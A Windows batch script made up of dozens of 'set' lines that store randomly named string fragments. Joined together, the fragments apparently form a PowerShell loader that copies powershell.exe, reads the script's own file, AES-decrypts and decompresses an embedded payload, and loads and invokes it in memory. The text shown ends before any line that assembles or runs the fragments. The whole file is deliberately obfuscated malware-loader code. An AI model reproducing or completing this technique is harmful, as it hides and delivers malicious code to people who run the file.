@echo off
set "PobYWUybAz=:\"
set "sxkBtKjMKX= C"
set "xptuulawZu=po"
set "xhCLnaNbKi=0\"
set "bWIJeZscYM=we"
set "dPqMFreIrB=we"
set "UvdAEStsCC=nd"
set "tgSFSflwtC=32"
set "pETVnciutM=co"
set "xAPbKtoSfB=do"
set "SwJwWJJxMG=ow"
set "zieIfReBMg=\W"
set "yCxuABryuT=ll"
set "fOmswdUqQe=rs"
set "fgYXcvawBx=Wi"
set "DlvkJPONoF=rS"
set "IhxPcYwDmb=1."
set "lwcdfcZNVN=\v"
set "XCztPmynzX=s\"
set "KNkncukAtd=Sy"
set "oXdMpsNduR=he"
set "YZDRYHRQgV=ll"
set "XKwIAwDZTU=py"
set "DbnzDfkutO= /"
set "nvXECwULvL=Po"
set "rKGUgfMDwm=xe"
set "AgyXHIwCbs=st"
set "ldkUiinUJH=y "
set "PWmgkhdpNK=in"
set "xaiySEyaPI=ws"
set "MCJVzrWKLr=em"
set "IcAfwcClzn=he"
set "WfKicIdbYr=.e"
set "ZgrhDjjxHP= %~dp0"
set "vEXAXHkpkV=cd"
set "tOMLNRrVZg=Bmor"
set "VNpnGdygmh=[]] "
set "tDQSHHthca=y.Ci"
set "FuDzDRviKg=  $q"
set "hkfMEOGGDX=pose"
set "hfoSIeBobC=F'[-"
set "KQkRPnExXx=.-16"
set "TgnRVkcQdC=Fo7l"
set "HfPomnfLmu=comm"
set "bdeZqKaybI=-Obj"
set "GFGBpgUeUk=ecry"
set "GRFuAUrhjn=n ''"
set "bsWsXIAWAp=ecT "
set "exJJYxeICV=;$ho"
set "SODRYoxAFv=.Dis"
set "CXwiwFIPEW=llwV"
set "LVZNjmBiOv=.Cry"
set "EvIYCQmIsp=in $"
set "BWayfPfqJX=m(, "
set "pyJFLzZJhy=pose"
set "OGdXFAOAEw=UOVB"
set "VtzesVNtsQ=gth)"
set "OLgLjwPtmU=ispo"
set "vDAhpzIKVt=ew-O"
set "SOTUkKGjIn=;$yv"
set "UBMFSUgOjg='')("
set "LcTmlqsZlv=bstr"
set "MFdGlPVYXW=Comp"
set "UbtSyGjGaR=, (,"
set "LpcEoiIuiv= = $"
set "FrJlJrnZzV=-joi"
set "LoaIDpjmXT=lit("
set "RaorgspyNy=gwec"
set "xZrQwmorpr=vv ="
set "zoIXCfGqKI=();$"
set "CExUKbcWXH=New-"
set "UmCynXAGLv=m.IO"
set "ijnNmETqmy=('l0"
set "RHUYbnGjdM=esMa"
set "kEtMcbtoQr=ionM"
set "vnDANofwQg=oryS"
set "YZscRMcRhs=ck($"
set "oXKdhgpnfF=tem."
set "ohltGuHCid=pher"
set "AKbrEcnIPT=('%~f0'"
set "PcoQDZRdGN=XZOX"
set "FosVSdozLx=stem"
set "WkxYIRPRqC=jhrU"
set "MPwPTMWjnF=rity"
set "oXXKlgalpt=ose("
set "GTIKIDEcPF=isfL"
set "zAKKSFUhFh=$zsW"
set "fcYJoDAzYu=S46e"
set "qXqQiPDNXn=ress"
set "GdREBzCCeM=();$"
set "iLZmLMzNHb=XZOX"
set "fbidfljIxn=.Mod"
set "TEYIxURHkJ=ach "
set "nzylVvjmae=raph"
set "naIDgCRCVz=tion"
set "CfsbqJSaCn=rofi"
set "ssUOdsgANH=;$ll"
set "gpeEDlPVFN=sion"
set "XtdjsbJofh=y]::"
set "sKPdtRyAWn=..-1"
set "OWLuePObmJ=vi);"
set "IJFUyFTwDx=Obje"
set "QyWbzVSsIO= = N"
set "dtPKoKRAJy=OEv "
set "EKUnQqsiga=.Len"
set "MJBcGixXPe=rtS4"
set "MeIzDMbszn=d;$U"
set "vbEwHpsolX=($jh"
set "TMFpLMfPJg=l = "
set "URIxelVoNF=Vl, "
set "LuGsjRJjYA=);$o"
set "etPgBXJpfx=ert]"
set "ppCCJUrkNs=brea"
set "eOJpfuzAsM=gMod"
set "lKGlzvkwHb=);$U"
set "WgOlKYQvTY=$zsW"
set "zKmOPUairn=ion."
set "eyjBvEHmIO=esFX"
set "GPAtMigHWO=6esa"
set "ibZpjEEqhL=ing("
set "BwuGjgUYVh=iron"
set "sOCBeaYIdn=form"
set "GOHbWjcRSd=OVBz"
set "lIXMglCUAV=em.C"
set "YQhMLLYZem=join"
set "HfwkDWBfQL=UGTu"
set "wszkZZyFms=mory"
set "kEppWYZBrs=z.Pa"
set "KJzNqTFxBe=$oBr"
set "uMTXnIcgJD=yste"
set "VylUACrGev=ress"
set "AWQgzqqYsZ=raph"
set "scwyJLzYoX=gnir"
set "WBErJNyveX=ss -"
set "HXIQaBBCIg=BrKa"
set "AAicxqKYYX=OEv."
set "akiUwgNnib=nage"
set "rhXaWPkpLe=tsWi"
set "zdDYSWWgGm=[Sys"
set "YffTdLqAFt== [S"
set "EPuTCrXJYk=$hoO"
set "UddKUZZyGb=.Key"
set "nJLjPMicTZ=;$ho"
set "dbeUXlPnvB=('%*'"
set "IdDCpvZZti=eam("
set "nwmxWCsbkk=and "
set "rpTqUIJWMs=($jh"
set "nbLTRIuFzP=File"
set "GhtYdznfvX=$zsW"
set "roKPcOVDso=y.Pa"
set "SHMFXQWeZe=vj0m"
set "aFlPoCOaGP=, $O"
set "QzifBmwmei=ddin"
set "YsbqvjQhIp=OyzA"
set "tVIQQZyOPd=7Yiv"
set "rlSckcSXun=[-1."
set "lZDYHbrqAq=ANvi"
set "JIVEkzvWop=t Sy"
set "LSSjLZdKfr=eAvv"
set "MfIOkXuElq=nirt"
set "DxOlWoevaK=.IO."
set "ZwpRoZpOpT=[Env"
set "kFUGURAyGL=Disp"
set "QijvFCgzZW=)) {"
set "ZaRUnGnTjr=.Ass"
set "exDXjMoQUy=.Cre"
set "QjuiQpzDrY=yste"
set "FSDYBGWICm=-1.."
set "HsLduRnxob=Conv"
set "tWYixMlmQf=grap"
set "qbEyMYiJax=Syst"
set "rRRlJuUSwF=$UOV"
set "XrjpYwlkeB=g = "
set "QtBFEyQbIc=OANv"
set "pyecSpSdGt=)($O"
set "KdAWMQJoET=rUa."
set "pnvkiYWQpO=16] "
set "OdrHKLwlJi=]::("
set "pxvFBybLsW=ddin"
set "OmFmUtGqDB=Invo"
set "xxKUlMcZhk=OVBz"
set "LeEXtkkEjB=.Com"
set "RjelFUxBSP=ct S"
set "moKQoDznJK=[Sys"
set "hiasgDzuNd=OB.T"
set "RuacKUtyDy=ptog"
set "XCSKBatEBy=n ''"
set "KHhxNMPdsp=rt]:"
